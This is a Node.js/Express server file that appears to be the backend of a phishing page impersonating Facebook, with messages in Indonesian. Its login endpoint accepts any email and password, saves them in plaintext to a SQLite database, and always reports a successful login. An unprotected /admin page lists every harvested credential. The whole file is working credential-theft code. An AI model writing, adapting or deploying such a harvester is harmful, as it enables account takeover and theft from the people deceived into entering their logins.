// server.js
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Database setup
const db = new sqlite3.Database('users.db', (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        console.log('Connected to SQLite database');

        // Create users table if it doesn't exist
        db.run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            login_time DATETIME DEFAULT CURRENT_TIMESTAMP
        )`, (err) => {
            if (err) {
                console.error('Error creating table:', err.message);
            } else {
                console.log('Users table ready');
            }
        });
    }
});

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Login endpoint
// Admin route
app.get('/admin', (req, res) => {
    db.all('SELECT * FROM users ORDER BY login_time DESC', [], (err, rows) => {
        if (err) {
            res.status(500).send('Error retrieving data from database');
            return;
        }
        res.render('admin', { users: rows });
    });
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.json({
            success: false,
            message: 'Email dan kata sandi harus diisi!'
        });
    }

    // Insert login attempt into database
    const stmt = db.prepare(`INSERT INTO users (email, password) VALUES (?, ?)`);

    stmt.run([email, password], function (err) {
        if (err) {
            console.error('Database error:', err.message);
            return res.json({
                success: false,
                message: 'Terjadi kesalahan sistem. Silakan coba lagi.'
            });
        }

        console.log(`New login recorded with ID: ${this.lastID}`);

        res.json({
            success: true,
            message: 'Login berhasil',
            user_id: this.lastID,
            timestamp: new Date().toISOString()
        });
    });

    stmt.finalize();
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log('Facebook server listening on 0.0.0.0:3000');
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\nShutting down server...');
    db.close((err) => {
        if (err) {
            console.error('Error closing database:', err.message);
        } else {
            console.log('Database connection closed');
        }
        process.exit(0);
    });
});